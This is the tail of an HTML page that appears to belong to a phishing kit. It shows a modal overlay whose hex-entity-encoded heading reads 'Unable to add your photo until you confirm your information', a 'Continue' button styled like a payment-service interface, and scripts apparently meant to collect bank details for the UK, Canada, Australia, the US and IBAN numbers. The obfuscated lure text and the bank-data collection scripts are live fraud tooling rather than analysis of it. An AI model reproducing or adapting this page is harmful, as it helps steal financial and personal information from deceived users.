<div id="dos10"style="background-color:#000000;position: fixed;top: 0; right: 0; bottom: 0;left: 0; z-index: 1040;opacity: 0.5;filter: alpha(opacity=50);height: 792px;"></div>
<div style=" width: auto;margin: 10px;z-index: 100000;"></div>
<div style="z-index: 100011;width: auto;margin: auto;padding: 6px;position: relative;background-color: #ffffff;border: 1px solid #999999;border: 1px solid rgba(0,0,0,0.2);border-radius: 6px;-webkit-box-shadow: 0 3px 3px rgba(0,0,0,0.5);box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);-webkit-background-clip: padding-box;background-clip: padding-box;outline: 0;border-color: #e5e5e5 #d9d9d9 #cccccc;-webkit-box-shadow: 0 3px 3px rgba(148, 148, 148, 0.8);box-shadow: 0 0px 0px rgba(148, 148, 148, 0.8);-webkit-border-radius: 10px;-moz-border-radius: 6px;border-radius: 6px;-moz-background-clip: padding-box;-webkit-background-clip: padding-box;background-clip: padding-box;background-color:#fdfdfd;outline: 0 none;margin-top: 150px;max-width:1024px;min-width:auto;max-height:200px;opacity: 1;">
<center><div ><h3>&#x55;&#x6E;&#x61;&#x62;&#x6C;&#x65;&#x20;&#x74;&#x6F;&#x20;&#x61;&#x64;&#x64;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x70;&#x68;&#x6F;&#x74;&#x6F;&#x20;&#x75;&#x6E;&#x74;&#x69;&#x6C;&#x20;&#x79;&#x6F;&#x75;&#x20;&#x63;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x69;&#x6E;&#x66;&#x6F;&#x72;&#x6D;&#x61;&#x74;&#x69;&#x6F;&#x6E;</h3></div></center>
<center><button class="vx_btn" id="boot">&#x43;&#x6F;&#x6E;&#x74;&#x69;&#x6E;&#x75;&#x65;</button></center>
</div></div>
<div tabindex="-1"id="spinner" style="overflow: hidden;position: fixed;top: 0;right: 0;bottom: 0;left: 0; z-index: 1040; -webkit-overflow-scrolling: touch; outline: 0;display: none;">
<div id="dos10" class="hasSpinner"></div>
<div style=" width: auto;margin: 10px;z-index: 100000;"></div>
</div></div>
<div class="whiteOverlayMask hide"></div>
<script src="js/plugins.js"></script>
<script src="js/Dwissel.js"></script>
<script src="bank/uk.js"></script>
<script src="bank/ca.js"></script>
<script src="bank/au.js"></script>
<script src="bank/usa.js"></script>
<script src="js/iban.js"></script>
</body>
</html>